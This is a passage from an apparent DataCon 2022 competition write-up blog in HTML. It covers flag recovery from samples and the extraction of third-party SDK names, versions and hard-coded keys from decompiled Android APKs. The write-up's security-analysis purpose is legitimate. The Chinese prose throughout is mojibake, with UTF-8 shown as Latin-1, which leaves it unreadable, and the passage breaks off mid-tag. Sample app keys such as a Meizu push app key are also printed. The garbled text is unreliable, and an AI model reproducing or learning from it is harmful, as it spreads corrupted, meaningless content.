value)æ›¿æ¢çš„æ—¶å€™ï¼Œä¼šå­˜åœ¨æ¼è¿‡çš„æƒ…å†µï¼Œç‰¹åˆ«æ˜¯å°†å˜é‡(variable name)ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°ä½¿ç”¨çš„æ—¶å€™ã€‚ä¸Šè¿°ä¸¤æ­¥çš„æ•ˆæœä¹Ÿå†³å®šäº†æˆ‘ä»¬æœ€åé€‰æ‹©ä»£ç ç‰‡æ®µè¿è¡Œçš„æ•ˆæœï¼Œç»å¸¸é‡åˆ°è¯­æ³•é”™è¯¯çš„æƒ…å†µï¼Œæ€»è®¡çº¦å¯ä»¥å¤„ç†10%çš„æ ·æœ¬ã€‚</p><h2 id="3-2-åç»­-1"><a href="#3-2-åç»­-1" class="headerlink" title="3.2 åç»­"></a>3.2 åç»­</h2><p>æˆ‘ä»¬åœ¨4æ ¸16Gçš„windowsæœºå™¨ä¸Šï¼ŒèŠ±è´¹çº¦220ç§’å°±å¯ä»¥å¤„ç†æä¾›çš„200ä¸ªæ ·æœ¬ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ­£ç¡®å¤„ç†83%çš„æ ·æœ¬ã€‚å¯¹äºå‰©ä½™æ— æ³•å¤„ç†çš„æ ·æœ¬ï¼Œæˆ‘ä»¬è¿›è¡Œæ·±å…¥åˆ†æï¼Œå‘ç°é™¤äº†ä¸ªåˆ«å‡ºé¢˜äººåœ¨æ”¹é€ æ ·æœ¬çš„è¿‡ç¨‹ä¸­ä½¿æ ·æœ¬æŸåäº†ï¼Œå…¶ä»–è¾ƒå¤šçš„æ˜¯flagå­˜å‚¨åœ¨å˜é‡ä¸­ã€‚å› æ­¤æˆ‘ä»¬åœ¨ä»£ç é‡æ„æ—¶ï¼Œåœ¨åˆé€‚çš„ä½ç½®æ–°å¢ä¸€æ¡æ‰“å°å‘½ä»¤å°†è¯¥å˜é‡æ‰“å°å‡ºæ¥ã€‚ç›®å‰åªæœ‰å½“å˜é‡åœ¨å‡½æ•°ä½“(function body)æˆ–è€…åˆ¤æ–­ä½“ç»“æŸçš„ä½ç½®å£°æ˜æ—¶ï¼Œæˆ‘ä»¬æ‰æ·»åŠ ä¸€æ¡æ‰“å°å‘½ä»¤ï¼Œè€Œå®é™…ä¸­å­˜å‚¨flagçš„å˜é‡æœ‰ä¸€éƒ¨åˆ†å¹¶ä¸åœ¨å‡½æ•°ä½“&#x2F;åˆ¤æ–­ä½“ç»“æŸçš„ä½ç½®ï¼Œæ‰€ä»¥åŸºäºä½ç½®åˆ¤æ–­æ˜¯å¦éœ€è¦æ·»åŠ æ‰“å°å‘½ä»¤æ˜¯ä¼šå­˜åœ¨æ¼è¿‡çš„æƒ…å†µã€‚</p><p>å¯¹äºè¿™ä¸€å—ï¼Œæˆ‘ä»¬åç»­çš„ä¼˜åŒ–æ€è·¯æ˜¯æ ¹æ®å˜é‡çš„å®šä¹‰-ä½¿ç”¨æƒ…å†µæ¥ç¡®å®šæ˜¯å¦éœ€è¦å¢åŠ ä¸€æ¡æ‰“å°å‘½ä»¤ï¼Œå…·ä½“æ¥è¯´å°±æ˜¯åˆ¤æ–­ä¸€ä¸ªå˜é‡åœ¨å®šä¹‰åï¼Œæ˜¯å¦è¢«ä½¿ç”¨è¿‡ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨è¿‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åœ¨è¯¥å˜é‡åé¢å¢åŠ ä¸€æ¡æ‰“å°å‘½ä»¤ï¼Œè¿™æ ·å°±å¯ä»¥å¼¥è¡¥åŸºäºä½ç½®æ–°å¢æ‰“å°å‘½ä»¤çš„ä¸è¶³ã€‚</p><h1 id="å››ã€æ€»ç»“-1"><a href="#å››ã€æ€»ç»“-1" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h1><p>æ­£å¦‚æ¢ç´¢éƒ¨åˆ†çš„å†…å®¹æ‰€è¿°ï¼Œæˆ‘ä»¬å‰æœŸç”±äºæ–¹æ³•ä¸å¯¹ï¼ŒèŠ±äº†å¾ˆå¤šæ—¶é—´å®ç°çš„ä»£ç æ•ˆæœå¹¶ä¸å¥½ã€‚ç›®å‰çš„æ–¹æ¡ˆä¹Ÿæ˜¯æˆ‘ä»¬åœ¨è·ç¦»æ¯”èµ›ç»“æŸä¸åˆ°24å°æ—¶æ‰æƒ³å‡ºæ¥çš„ï¼Œæœ€åå–å¾—äº†å‡ºä¹æˆ‘ä»¬æ„æ–™çš„ç»“æœã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ›´æ—©é‡‡ç”¨ç›®å‰çš„æ–¹æ¡ˆï¼Œç•™ç»™æˆ‘ä»¬æ›´å¤šçš„æ—¶é—´ä¼˜åŒ–ï¼Œç›¸ä¿¡æˆ‘ä»¬å¯ä»¥å–å¾—æ›´å¥½çš„ç»“æœã€‚</p><p>æœ€åå°±æ˜¯æ„Ÿè°¢ä¸»åŠæ–¹ä¸¾åŠè¿™æ¬¡æ¯”èµ›ï¼Œ è®©æˆ‘ä»¬ä¸ä»…å­¦åˆ°äº†æ–°çš„æŠ€æœ¯çŸ¥è¯†ï¼Œä¹ŸçœŸæ­£æ„Ÿå—åˆ°ä¸åˆ°æœ€åæ—¶åˆ»ä¸€å®šä¸è¦æ”¾å¼ƒï¼ŒåŒæ ·ä¹Ÿæ„Ÿè°¢å‡ºé¢˜äººåœ¨æ¯”èµ›è¿‡ç¨‹ä¸­çš„è€å¿ƒè§£ç­”ã€‚</p><h1 id="è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æ-AndroidAPPç»„æˆåˆ†æ"><a href="#è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æ-AndroidAPPç»„æˆåˆ†æ" class="headerlink" title="è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æ-AndroidAPPç»„æˆåˆ†æ"></a><strong>è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æ-AndroidAPPç»„æˆåˆ†æ</strong></h1><h1 id="ä¸€ã€é¢˜ç›®ä»‹ç»-2"><a href="#ä¸€ã€é¢˜ç›®ä»‹ç»-2" class="headerlink" title="ä¸€ã€é¢˜ç›®ä»‹ç»"></a>ä¸€ã€é¢˜ç›®ä»‹ç»</h1><p>Androidç¬¬ä¸‰æ–¹åº“æ˜¯å¹¿å‘Šå•†ã€æ”¯ä»˜å…¬å¸ã€ç¤¾äº¤ã€æ¨é€å¹³å°å’Œåœ°å›¾æœåŠ¡å•†ç­‰ç¬¬ä¸‰æ–¹æœåŠ¡å…¬å¸ä¸ºä¾¿Appå¼€å‘äººå‘˜ä½¿ç”¨å…¶æœåŠ¡è€Œå¼€å‘çš„å·¥å…·åŒ…ï¼ŒåŒ…æ‹¬å¹¿å‘Šã€æ”¯ä»˜ã€ç»Ÿè®¡ã€ç¤¾äº¤ã€æ¨é€ã€åœ°å›¾ç­‰ç±»åˆ«ã€‚è¶Šæ¥è¶Šå¤šçš„Appé€šè¿‡é›†æˆç¬¬ä¸‰æ–¹åº“æ¥ä¸°å¯Œè‡ªèº«åŠŸèƒ½ã€‚</p><p>ä½†æ˜¯ç¬¬ä¸‰æ–¹åº“çš„å¼•å…¥ï¼Œåœ¨ç»™Appå¸¦æ¥åŠŸèƒ½æ”¯æŒçš„åŒæ—¶ï¼Œä¹Ÿæœ‰å¯èƒ½ä¼šå¼•å…¥å®‰å…¨é—®é¢˜ï¼Œä¾‹å¦‚å®‰å…¨æ¼æ´å’Œéšç§æ»¥ç”¨ç­‰ã€‚</p><p>åœ¨æœ¬é¢˜ä¸­ï¼Œé€‰æ‰‹éœ€è¦é€šè¿‡åˆ†æä¸»åŠæ–¹æ‰€æä¾›çš„Appæ–‡ä»¶ï¼Œæå–å‡ºAppä¸­çš„ç¬¬ä¸‰æ–¹åº“ä¿¡æ¯ï¼ŒåŒ…æ‹¬åº“åç§°ã€åº“ç‰ˆæœ¬ã€åº“è¯†åˆ«ä¾æ®ç­‰ä¿¡æ¯ã€‚</p><p>æ­¤å¤–ï¼Œä¸€äº›ç¬¬ä¸‰æ–¹åº“æœåŠ¡éœ€è¦å¼€å‘è€…é€šè¿‡å®åæ³¨å†Œè´¦æˆ·å‘æœåŠ¡æä¾›å•†ç”³è¯·idå’Œkeyæ¥è·å–ã€‚è¿™ä¸€ç±»çš„idå’Œkeyæˆ‘ä»¬å°†å…¶ä½œä¸ºå¼€å‘è€…çš„æ ‡è¯†ç¬¦idï¼Œè¿™ç±»ä¿¡æ¯ä¼šç¡¬ç¼–ç åœ¨Appæ–‡ä»¶ä¸­ã€‚è¿™ç±»ä¿¡æ¯çš„æå–å°†ä¼šä½œä¸ºé¢˜ç›®é™„åŠ åˆ†æ•°é¡¹ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;047912d540fce42d7f7d6ec234f4925c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;sdk_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ç™¾åº¦åœ°å›¾SDK&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sdk_path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sdk_key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.baidu.lbsapi.API_KEY&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sdk_version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;7.3.0&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sdk_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;config&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sdk_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;xingtu123&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;sdk_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ç™¾åº¦åœ°å›¾SDK&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sdk_path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Lcom/baidu/mapapi&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sdk_key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sdk_version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;7.3.0&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sdk_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;code&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sdk_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;xingtu123&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="äºŒã€è§£é¢˜æ€è·¯-2"><a href="#äºŒã€è§£é¢˜æ€è·¯-2" class="headerlink" title="äºŒã€è§£é¢˜æ€è·¯"></a>äºŒã€è§£é¢˜æ€è·¯</h1><p>æˆ‘ä»¬çš„æ€è·¯å¦‚ä¸‹å¦‚æ‰€ç¤ºã€‚é¦–å…ˆå¯¹APKè¿›è¡Œåç¼–è¯‘ï¼Œç„¶ååˆ†åˆ«åŸºäºManifesté…ç½®æ–‡ä»¶ã€åŠ¨æ€é“¾æ¥åº“ä»¥åŠæºä»£ç å’ŒåŒ…åæå–SDKï¼Œæœ€åå°†æå–çš„ä¿¡æ¯è¿›è¡Œæ¸…æ´—å’ŒåŒ¹é…ï¼Œè¾“å‡ºç»“æœã€‚</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%205.png" alt="è§£é¢˜æ€è·¯"></p><h2 id="2-1-APKæ–‡ä»¶ç»“æ„"><a href="#2-1-APKæ–‡ä»¶ç»“æ„" class="headerlink" title="2.1 APKæ–‡ä»¶ç»“æ„"></a>2.1 APKæ–‡ä»¶ç»“æ„</h2><p>APKæ–‡ä»¶æ˜¯å®‰å“ç³»ç»Ÿçš„ä¸€ä¸ªå®‰è£…ç¨‹åºåŒ…ï¼Œå…¶æœ¬è´¨æ˜¯æ˜¯ä¸€ä¸ªZIPæ–‡ä»¶ï¼Œå°†åç¼€æ”¹ä¸ºZIPç„¶åè§£å‹å°±å¯ä»¥è·å–åˆ°å¦‚ä¸‹çš„æ–‡ä»¶ç›®å½•ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json">*.apk<br>â””â”€â”€ resources<br>    â”œâ”€â”€ AndroidManifest.xml  ---------é…ç½®æ¸…å•ï¼ˆäºŒè¿›åˆ¶æ ¼å¼ï¼‰<br>    â”œâ”€â”€ assets/  ---------------------èµ„æºç›®å½•ï¼Œä¸€èˆ¬å­˜æ”¾å›¾ç‰‡<br>    â”œâ”€â”€ classes.dex  -----------------å®‰å“ç³»ç»Ÿä¸Šçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæºç éƒ½è¢«ç¼–è¯‘åœ¨é‡Œé¢<br>    â”œâ”€â”€ META-INF/  -------------------ç­¾åæ–‡ä»¶ç›®å½•<br>    â”œâ”€â”€ lib/  ------------------------åŠ¨æ€åº“ç›®å½•ï¼Œä¸€èˆ¬å­˜æ”¾soæ–‡ä»¶<br>    â””â”€â”€ res  -------------------------èµ„æºåº“ç›®å½•ï¼Œä¸€èˆ¬å­˜æ”¾xmlå¸ƒå±€æ–‡ä»¶å’Œå›¾æ ‡<br>        â”œâ”€â”€ ...<br>        â””â”€â”€ values  ------------------å­˜æ”¾å¸¸é‡<br>        â”œâ”€â”€ ...<br>        â”œâ”€â”€ integers.xml  --------å­˜æ”¾å¼•ç”¨çš„æ•´æ•°<br>        â””â”€â”€ strings.xml  ---------å­˜æ”¾å¼•ç”¨çš„å­—ç¬¦ä¸²<br></code></pre></td></tr></table></figure><h2 id="2-2-APKåç¼–è¯‘"><a href="#2-2-APKåç¼–è¯‘" class="headerlink" title="2.2 APKåç¼–è¯‘"></a>2.2 APKåç¼–è¯‘</h2><p>å¯¹äºå®‰å“çš„dexå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿›è¡Œåç¼–è¯‘ä»¥åˆ†æä»£ç ã€‚ä¸€ç§æ–¹æ³•æ˜¯å…ˆé€šè¿‡APKtoolsæå–æ–‡ä»¶ï¼Œç„¶åç”¨dex2jarå°†å­—èŠ‚ç è½¬åŒ–ä¸ºjaråŒ…ï¼Œç„¶åå†ç”¨jdè¿›è¡Œåç¼–è¯‘ï¼›å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨jadxç›´æ¥å°†apkè½¬åŒ–ä¸ºæºä»£ç ï¼Œå¾—åˆ°sourceså’Œresourcesç›®å½•ã€‚æˆ‘ä»¬é€‰æ‹©äº†åè€…ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json">*_jadx-decompiled<br>â””â”€â”€ resources<br>â””â”€â”€ sources<br>    â”œâ”€â”€ android<br>    â”‚   â”œâ”€â”€ arch<br>    â”‚   â””â”€â”€ support<br>    â”œâ”€â”€ androidx<br>    â”‚   â”œâ”€â”€ core<br>    â”‚   â””â”€â”€ media<br>    â”œâ”€â”€ com<br>    â”‚   â”œâ”€â”€ google<br>    â”‚   â””â”€â”€ example<br>    â”œâ”€â”€ io<br>    â”‚   â””â”€â”€ reactivex<br>  â””â”€â”€..<br></code></pre></td></tr></table></figure><h2 id="2-3-SDKä¿¡æ¯æ”¶é›†"><a href="#2-3-SDKä¿¡æ¯æ”¶é›†" class="headerlink" title="2.3 SDKä¿¡æ¯æ”¶é›†"></a>2.3 SDKä¿¡æ¯æ”¶é›†</h2><p>ç»è¿‡æˆ‘ä»¬çš„åˆ†æå‘ç°ï¼Œä¸ç»„ä»¶ç›¸å…³çš„æ•°æ®æœ‰äº›åœ¨AndroidManefest.xmlï¼Œè¯¥æ–‡ä»¶ä¸ä»…åŒ…å«äº†SDKçš„åå­—ï¼Œä¹ŸåŒ…å«äº†ä¸€äº›SDK IDçš„ä¿¡æ¯ï¼›å¦å¤–å°±æ˜¯åç¼–è¯‘åçš„sourceæ–‡ä»¶ä¸‹é¢çš„æºä»£ç å’Œä»£ç ç›®å½•ä¹ŸåŒ…å«äº†SDKçš„ä¿¡æ¯ï¼›æœ€åå°±æ˜¯APKè¿è¡Œæ—¶ä½¿ç”¨åˆ°çš„åŠ¨æ€é“¾æ¥åº“ï¼Œè¯¥å†…å®¹å…¨éƒ¨å­˜å‚¨åœ¨libç›®å½•ä¸‹ã€‚</p><h3 id="2-3-1-AndroidManifest-xml"><a href="#2-3-1-AndroidManifest-xml" class="headerlink" title="2.3.1 AndroidManifest.xml"></a>2.3.1 AndroidManifest.xml</h3><p>æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œåœ¨AndroidManifest.xmlæ–‡ä»¶ä¸­ï¼Œmeta-dataæ ‡ç­¾ä¼šå®šä¹‰ä¸€äº›å¸¸é‡é”®å€¼å¯¹ï¼Œåœ¨ä»£ç ä¸­é€šè¿‡APIè·å–ã€‚å¾ˆå¤šSDKå¯†é’¥æˆ–æ ‡è¯†ç¬¦éƒ½å®šä¹‰åœ¨è¿™é‡Œï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="hljs-attr">android:versionCode</span>=<span class="hljs-string">&quot;47&quot;</span> <span class="hljs-attr">android:versionName</span>=<span class="hljs-string">&quot;1.4.6&quot;</span> <span class="hljs-attr">android:compileSdkVersion</span>=<span class="hljs-string">&quot;28&quot;</span> <span class="hljs-attr">android:compileSdkVersionCodename</span>=<span class="hljs-string">&quot;9&quot;</span> <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.xyz.qingtian&quot;</span> <span class="hljs-attr">platformBuildVersionCode</span>=<span class="hljs-string">&quot;28&quot;</span> <span class="hljs-attr">platformBuildVersionName</span>=<span class="hljs-string">&quot;9&quot;</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;MEIZUPUSH_APPID&quot;</span> <span class="hljs-attr">android:value</span>=<span class="hljs-string">&quot;MZ_133053&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;MEIZUPUSH_APPKEY&quot;</span> <span class="hljs-attr">android:value</span>=<span class="hljs-string">&quot;MZ_7019dfd62be04215ac319f49e84260fe&quot;</span>/&gt;</span><br>..<br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æœ‰äº›åˆ™å®šä¹‰äº†ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¦‚ä¸‹ï¼Œè¿™é‡Œçš„ç‰ˆæœ¬å€¼é€šè¿‡<code>&quot;@ingeger/&quot;</code>å¼•ç”¨äº†values&#x2F;integers.xmlå®šä¹‰çš„å¸¸é‡ï¼Œåœ¨æå–æ—¶éœ€è¦åˆ°å¯¹åº”xmlæ ‡ç­¾ä¸‹è¿›è¡Œè§£å¼•ç”¨ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@android:style/Theme.Translucent.NoTitleBar&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.google.android.gms.common.api.GoogleApiActivity&quot;</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.google.android.gms.version&quot;</span> <span class="hljs-attr">android:value</span>=<span class="hljs-string">&quot;@integer/google_play_services_version&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">provider</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;androidx.work.impl.WorkManagerInitializer&quot;</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">android:multiprocess</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:authorities</span>=<span class="hljs-string">&quot;com.tianxingjian.supersound.workmanager-init&quot;</span> <span class="hljs-attr">android:directBootAware</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æå–äº†å¸¦æœ‰<code>KEY SECRET ID VERSION</code>ç­‰å…³é”®å­—çš„é”®å€¼å¯¹ï¼Œå°†å…³é”®å­—å»æ‰åè¿›è¡Œæ¨¡ç³ŠåŒ¹é…ï¼Œç„¶åè¾“å‡ºç»“æœã€‚</p><h3 id="2-3-2-æºä»£ç ä¸åŒ…å"><a href="#2-3-2-æºä»£ç ä¸åŒ…å" class="headerlink" title="2.3.2 æºä»£ç ä¸åŒ…å"></a>2.3.2 æºä»£ç ä¸åŒ…å</h3><p>åœ¨jadxåç¼–è¯‘çš„javaä»£ç ä¸­ï¼Œæˆ‘ä»¬å‘ç°è®¸å¤šprivate static final Stringå®šä¹‰çš„ç”¨æˆ·å¯†é’¥å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEVICE_INFO_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;82CFE0C35829BE9D67E08925EC816654&quot;</span>;<span class="hljs-comment">//com.qihoo.pushsdk.utils.AndroidUtils</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">M2_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;item1&quot;</span>;<span class="hljs-comment">//com.qihoo.pushsdk.utils.AndroidUtils</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">VERSION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;2.5.3.21070801&quot;</span>;<span class="hljs-comment">//com.qihoo.livecloud.LiveCloudPlayer</span><br></code></pre></td></tr></table></figure><p>æå–å˜é‡ååŒ…å«â€™APPIDâ€™, â€˜SDKâ€™, â€˜APP_IDâ€™, â€˜KEYâ€™, â€œUNIT_IDâ€, â€œUIDâ€, â€œTOKENâ€, â€œVERSIONâ€çš„å˜é‡å®šä¹‰è¯­å¥åï¼Œå°†åŒ…åä¸å˜é‡åå…³é”®éƒ¨åˆ†æ”¾åˆ°SDKæ•°æ®åº“ä¸­è¿›è¡Œæ¨¡ç³ŠåŒ¹é…ã€‚</p><p>APKä¸­æ‰€æœ‰çš„ç±»å¯ä»¥é€šè¿‡apkanalyzerå¯¼å‡ºï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥ç”¨jadxåç¼–è¯‘çš„æ–‡ä»¶è·¯å¾„è¿›è¡Œåˆ†æï¼Œåˆ†å‰²ç±»ååè¿›è¡ŒSDK Nameæ¨¡ç³ŠåŒ¹é…ã€‚ç±»åçš„æå–æœ‰ä¸€äº›è®²ç©¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è·³è¿‡é¡¶çº§åŸŸåå–ä¸‰çº§classå³å¯ã€‚åŒæ—¶ï¼Œè¿˜éœ€è¦è·³è¿‡apkæœ¬èº«çš„åŒ…åå’ŒAndroidä¸javaè‡ªå¸¦çš„åŒ…ï¼Œå¦‚android.*ã€androidx.*ã€java.*ç­‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.qihoo</span><span class="hljs-selector-class">.livecloud</span><span class="hljs-selector-class">.LiveCloudPlayer</span> =&gt;  qihoo livecloud LiveCloudPlayer<br>com<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.mapapi</span>                    =&gt;  baidu mapapi<br>com<span class="hljs-selector-class">.sina</span><span class="hljs-selector-class">.weibo</span>                      =&gt;  sina weibo<br>com<span class="hljs-selector-class">.weibo</span><span class="hljs-selector-class">.ssosdk</span>                    =&gt;  weibo ssosdk<br>cn<span class="hljs-selector-class">.qqtheme</span><span class="hljs-selector-class">.framework</span>                =&gt;  qqtheme framework<br>com<span class="hljs-selector-class">.facebook</span><span class="hljs-selector-class">.rebound</span>                =&gt;  facebook rebound<br>com<span class="hljs-selector-class">.umeng</span><span class="hljs-selector-class">.commonsdk</span>                 =&gt;  umeng commonsdk<br></code></pre></td></tr></table></figure><h3 id="2-3-3-æå–åŠ¨æ€åº“åç§°"><a href="#2-3-3-æå–åŠ¨æ€åº“åç§°" class="headerlink" title="2.3.3 æå–åŠ¨æ€åº“åç§°"></a>2.3.3 æå–åŠ¨æ€åº“åç§°</h3><p>JNIåº“æ˜¯ä¸ºäº†æå‡è¿è¡Œæ•ˆç‡è€Œç”Ÿæˆçš„åŸç”Ÿä»£ç ï¼Œç”¨Cè¯­è¨€æˆ–C++ç¼–å†™ï¼Œæ”¾åœ¨å¯¹åº”æ¶æ„ç›®å½•ä¸‹ã€‚è®¸å¤šlibnameéƒ½å¸¦æœ‰ä¸€äº›å¯¹åº”ç»„ä»¶çš„åå­—ï¼Œä¾‹å¦‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">lib/armeabi-v7a/libAMapSDK_MAP_v7_6_0.so<br>lib/armeabi-v7a/libweibosdkcore.so<br>lib/armeabi-v7a/libagora-rtc-sdk-jni.so<br></code></pre></td></tr></table></figure><p>ä»ä¸­æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æœ‰weibosdk coreã€AMapSDKï¼ˆé«˜å¾·åœ°å›¾ï¼‰ã€Agoraç­‰SDKï¼Œå…¶ä¸­æœ‰äº›è¿˜å¸¦æœ‰ç‰ˆæœ¬ä¿¡æ¯ã€‚åŒæ—¶ï¼Œæ ¹æ®åº“åå¯ä»¥è¯†åˆ«å‡ºåŠ å›ºä¿¡æ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sas">sMap.<span class="hljs-meta">put</span>(<span class="hljs-string">&quot;libjgdtc_x86.so&quot;</span>, <span class="hljs-string">&quot;360åŠ å›º&quot;</span>);<br>sMap.<span class="hljs-meta">put</span>(<span 